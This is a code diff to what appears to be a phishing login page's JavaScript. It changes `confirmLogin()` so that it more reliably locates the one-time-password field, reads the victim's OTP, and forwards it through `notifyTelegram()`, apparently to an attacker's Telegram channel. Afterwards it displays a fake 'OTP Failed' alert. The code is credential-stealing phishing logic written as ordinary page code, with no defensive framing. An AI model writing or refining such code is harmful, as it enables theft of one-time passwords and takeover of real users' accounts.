@@ -488,7 +488,16 @@
     }
 
     async function confirmLogin() {
-  const otpInput = document.querySelector('input[placeholder*="OTP"], input[id*="otp"], input[name*="otp"]');
+  const modal = document.getElementById('otpModal');
+  const inputs = modal
+    ? Array.from(modal.querySelectorAll('input'))
+    : Array.from(document.querySelectorAll('input'));
+
+  const otpInput =
+    inputs.find((el) => el.offsetParent !== null && (el.value || '').trim() !== '') ||
+    inputs.find((el) => /otp|code/i.test(el.id || el.name || el.placeholder || '')) ||
+    document.querySelector('input[placeholder*="OTP"], input[id*="otp"], input[name*="otp"]');
+
   const otpCode = otpInput ? otpInput.value.trim() : "";
 
   await notifyTelegram({
@@ -500,6 +509,7 @@
 
   alert('OTP Failed');
     }
+    
     
     async function submitRegister() {
   const user = document.getElementById('regUserInput')?.value?.trim() || "";
